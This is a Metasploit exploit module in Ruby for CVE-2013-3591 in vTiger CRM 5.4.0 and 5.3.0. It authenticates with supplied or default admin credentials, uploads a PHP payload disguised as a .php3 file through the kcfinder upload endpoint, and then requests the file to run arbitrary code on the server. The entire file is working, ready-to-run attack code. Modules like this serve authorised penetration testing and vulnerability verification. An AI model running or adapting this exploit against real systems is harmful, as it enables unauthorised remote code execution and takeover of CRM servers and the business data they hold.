##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution',
      'Description' => %q{
      vTiger CRM allows an authenticated user to upload files to embed within documents.
      Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP
      script and execute aribtrary PHP code remotely.

      This module was tested against vTiger CRM v5.4.0 and v5.3.0.
      },
      'Author' =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2013-3591'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats']
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 30 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base vTiger CRM directory path", '/vtigercrm/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", 'admin'])
      ], self.class)
  end

  def check
    res = nil
    begin
      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/index.php') })
    rescue
      vprint_error("Unable to access the index.php file")
      return CheckCode::Unknown
    end

    if res and res.code != 200
      vprint_error("Error accessing the index.php file")
      return CheckCode::Unknown
    end

    if res.body =~ /<div class="poweredBy">Powered by vtiger CRM - (.*)<\/div>/i
      vprint_status("vTiger CRM version: " + $1)
      case $1
      when '5.4.0', '5.3.0'
        return CheckCode::Appears
      else
        return CheckCode::Detected
      end
    end

    return CheckCode::Safe
  end

  def exploit

      init = send_request_cgi({
        'method' => 'GET',
        'uri' =>  normalize_uri(target_uri.path, '/index.php')
      })

      sess = init.get_cookies

      post = {
        'module' => 'Users',
        'action' => 'Authenticate',
        'return_module' => 'Users',
        'return_action' => 'Login',
        'user_name' => datastore['USERNAME'],
        'user_password' => datastore['PASSWORD']
      }

      login = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/index.php'),
        'vars_post' => post,
        'cookie' => sess
      })

      fname = rand_text_alphanumeric(rand(10)+6) + '.php3'
      cookies = login.get_cookies

      php = %Q|<?php #{payload.encoded} ?>|
      data = Rex::MIME::Message.new
      data.add_part(php, 'application/x-php', nil, "form-data; name=\"upload\"; filename=\"#{fname}\"");
      data.add_part('files', nil, nil, 'form-data; name="dir"')

      data_post = data.to_s

      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/kcfinder/browse.php?type=files&lng=en&act=upload'),
        'ctype' => "multipart/form-data; boundary=#{data.bound}",
        'data' => data_post,
        'cookie' => cookies
      })
      if res and res.code == 200
        print_status("Triggering payload...")
        send_request_raw({'uri' => datastore["TARGETURI"] + "/test/upload/files/#{fname}"}, 5)
      end
  end
end